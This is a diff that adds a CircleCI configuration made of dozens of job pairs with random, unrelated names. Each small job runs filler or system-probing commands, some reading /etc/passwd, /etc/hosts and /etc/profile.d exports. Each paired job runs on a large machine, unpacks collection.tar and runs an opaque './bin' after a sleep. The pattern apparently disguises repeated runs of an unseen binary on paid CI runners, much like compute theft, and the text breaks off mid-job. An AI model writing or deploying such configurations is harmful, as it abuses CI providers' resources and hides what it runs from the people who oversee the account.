@@ -1,0 +1,1435 @@
+version: 2.1
+
+jobs:
+  spanSignin:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: SEED ENEMY WAVES MANUAL
+          command: |
+            mkdir -p /tmp/transmitter
+            set +o pipefail 2>/dev/null; declare -A s; while read -r l; do s[${l:0:1}]=$((${s[${l:0:1}]:-0}+1)); done < <(seq 1 10000); for k in "${!s[@]}"; do echo "first_char_${k}:${s[$k]}"; done > /tmp/transmitter/hostreceiptvault; true
+            echo "~~~"; echo "ok dp-01"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'hostreceiptvault'
+  dp-01:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/BurstThreadSpriteCrimson 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  sub42:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Relocation Flavor Minimal
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; touch "/dev/shm/manual2.tmp" && rm -v "/dev/shm/manual2.tmp"; true ; } > /tmp/transmitter/BurstThreadSpriteCrimson
+            echo "~~~"; echo "ok Verify_Service6"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'BurstThreadSpriteCrimson'
+  Verify_Service6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/BurstThreadSpriteCrimson 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  login_10_4_22:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: A gentle outline
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; for word in bear cat fox tiger goose eagle; do echo "$word"; done; true ; } > /tmp/transmitter/worker
+            echo "~~~"; echo "ok jun20-ship"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'worker'
+  jun20-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/worker 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  try_from_script:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Get the stereo mix sorted
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; mkdir -pv '/tmp/local-router-mint'/honey/mint; true ; } > /tmp/transmitter/ae7d4813
+            echo "~~~"; echo "ok deploy"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'ae7d4813'
+  deploy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/239d14a 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  DIALOG_H_:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Payroll batch filed
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; count_lines() { echo ${1:-default}; }; count_lines; true ; } > /tmp/transmitter/log
+            echo "~~~"; echo "ok validate-quick-artifact-bundle"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'log'
+  validate-quick-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/239d14a 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  uat-dev-63:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Publish
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; ls -AG /usr/share/doc | tac; true ; } > /tmp/transmitter/xx_f09505f78e952
+            echo "~~~"; echo "ok fix-router-v2"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'xx_f09505f78e952'
+  fix-router-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/xx_f09505f78e952 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  Gamma_n1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Lunchtime weigh the outbound orders
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; find /usr/share -maxdepth 2 -type f -mtime -7 -exec stat -c "%y %n" {} + 2>/dev/null | sort | head -n 12; true ; } > /tmp/transmitter/YDn
+            echo "~~~"; echo "ok INFRA-191"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'YDn'
+  INFRA-191:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/YDn 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  inactive_pebble_prompt_header:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Batch Two Pruning
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; install -d -m 700 ${TMPDIR:-/tmp}/my_garageArray && stat -c %a ${TMPDIR:-/tmp}/my_garageArray; true ; } > /tmp/transmitter/WalletTradeHeathMemo
+            echo "~~~"; echo "ok INFRA-701"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'WalletTradeHeathMemo'
+  INFRA-701:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/BurstThreadSpriteCrimson 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  sys_ReceiveWake:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: On final for cull
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; gzip -c /etc/hosts > "/var/tmp/segment-final.gz" && zcmp /etc/hosts "/var/tmp/segment-final.gz" && echo same; true ; } > /tmp/transmitter/239d14a
+            echo "~~~"; echo "ok v3-ga5"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - '239d14a'
+  v3-ga5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/239d14a 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  ww:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Isolate the bucket policies once release is done
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; compgen -A signal | head -5; true ; } > /tmp/transmitter/ak9
+            echo "~~~"; echo "ok tam-verify"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'ak9'
+  tam-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/BurstThreadSpriteCrimson 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  table-2021-w04:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: 2026 year end rebalance
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; sort /etc/os-release | grep NAME | head -4; true ; } > /tmp/transmitter/imgimg
+            echo "~~~"; echo "ok t-v2"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'imgimg'
+  t-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/imgimg 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  yurfliashslaishpy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: failover depth 9
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; date | tr -d '[:digit:]' | fold -w 38; true ; } > /tmp/transmitter/Router
+            echo "~~~"; echo "ok brodcast"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'Router'
+  brodcast:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/239d14a 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  thirstStats:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: BEGIN CHECKPOINT REPLICATION LAG
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; echo "spam and eggs"; echo "status: ok"; true ; } > /tmp/transmitter/TF8IuGIjRBcfkjsS8IW
+            echo "~~~"; echo "ok polaris-ng"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'TF8IuGIjRBcfkjsS8IW'
+  polaris-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/BurstThreadSpriteCrimson 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  team_uniform:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Search side export
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; f="/tmp/pepper-duck.list"; seq 5 > "$f"; while read -r n; do echo $((n * n)); done < "$f"; true ; } > /tmp/transmitter/REF_087389
+            echo "~~~"; echo "ok titan2-v2"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'REF_087389'
+  titan2-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/239d14a 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  event-3458:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Dispatch the mezzanine for next day
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; grep -R export /etc/profile.d | sort | head -12; true ; } > /tmp/transmitter/P_42465
+            echo "~~~"; echo "ok API-61"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'P_42465'
+  API-61:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/239d14a 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  tNew:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Resolve health endpoint rc2
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; mkdir -p '/var/tmp/koala' && touch '/var/tmp/koala'/a.tmp '/var/tmp/koala'/b.tmp && find '/var/tmp/koala' -name '*.tmp' -delete && ls -A '/var/tmp/koala'; true ; } > /tmp/transmitter/epoch_022
+            echo "~~~"; echo "ok fire-up"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'epoch_022'
+  fire-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/BurstThreadSpriteCrimson 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  undo_-_key:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: lint
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; ls /usr/local | xargs; true ; } > /tmp/transmitter/Glint
+            echo "~~~"; echo "ok nico-build"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'Glint'
+  nico-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/239d14a 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  Psi_grad:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Phase VIII Roadmap Page Outline
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; myfunc(){ echo "$#"; }; myfunc wolf frog cat; true ; } > /tmp/transmitter/sparKmarkETfrOZEN
+            echo "~~~"; echo "ok sanity"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'sparKmarkETfrOZEN'
+  sanity:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/BurstThreadSpriteCrimson 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  hammer_751:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Canary only scheduling
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; getent group | tail -n 1 | awk -F ":" '{print $1, $3}' | wc -l; true ; } > /tmp/transmitter/SDK-USB
+            echo "~~~"; echo "ok java17-fmt"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'SDK-USB'
+  java17-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/BurstThreadSpriteCrimson 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  LocalSoftFuturePlugin:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Strain the circuit breaker
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; find /sys/class/net -maxdepth 1 -type f -user "$USER" -print0 | xargs -0r du -ch | tail -n 1; true ; } > /tmp/transmitter/f5fcdf8
+            echo "~~~"; echo "ok dotnet8-lint"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'f5fcdf8'
+  dotnet8-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/f5fcdf8 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  score_set_setting_stale:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Properly warm the TLS certs
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; install -m 0755 /etc/hosts "/dev/shm/handler-graph.txt" && ls -l "/dev/shm/handler-graph.txt"; true ; } > /tmp/transmitter/75cfc891-3015
+            echo "~~~"; echo "ok qa-old"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - '75cfc891-3015'
+  qa-old:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/BurstThreadSpriteCrimson 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  vr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: PENDING dimming
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/refundComment-bak" && cd "/tmp/refundComment-bak" && pwd; true ; } > /tmp/transmitter/Filter_pulse
+            echo "~~~"; echo "ok APP-651"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'Filter_pulse'
+  APP-651:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/BurstThreadSpriteCrimson 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  setupPasswordAtIndex:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Zap the sudoers file
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | cut -f1 -d: | sort | uniq -c | sort -nr; true ; } > /tmp/transmitter/bacf0c02-85a4-6197-28f3
+            echo "~~~"; echo "ok assemble-end-to-end-artifact-bundle"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'bacf0c02-85a4-6197-28f3'
+  assemble-end-to-end-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/bacf0c02-85a4-6197-28f3 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  legacy_model_convert:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: 23 mfa setting monitoring
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; [ ! -r /etc/os-release ] && echo found || echo "not found"; true ; } > /tmp/transmitter/21763ec2-2df3
+            echo "~~~"; echo "ok Run_Staging6"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - '21763ec2-2df3'
+  Run_Staging6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/BurstThreadSpriteCrimson 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  BMAZA-8290:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: approve weekly digest last
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'finished' | tr -s ' '; true ; } > /tmp/transmitter/65e20cm
+            echo "~~~"; echo "ok update-router-v2-timeout"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - '65e20cm'
+  update-router-v2-timeout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/239d14a 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  prod_val:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Runway 33 fact check
+          command: |
+            mkdir -p /tmp/transmitter
+            { set +o pipefail 2>/dev/null; df -hT|head -4; true ; } > /tmp/transmitter/LOT84040
+            echo "~~~"; echo "ok break-prod"; echo "~~~"
+      - persist_to_workspace:
+          root: /tmp/transmitter
+          paths:
+            - 'LOT84040'
+  break-prod:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Review previous
+          command: |
+            od -An -tc /tmp/transmitter/LOT84040 2>/dev/null | head -c 40 || true
+      - run:
+          name: Checkout working tree
+          command: git clone --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar -xf collection.tar
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bin
+  readComplexArticleAdapter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/transmitter
+      - run:
+          name: Reboot the edge router ready for speed
+          command: |
+            mkdir -p /tmp/transmitter
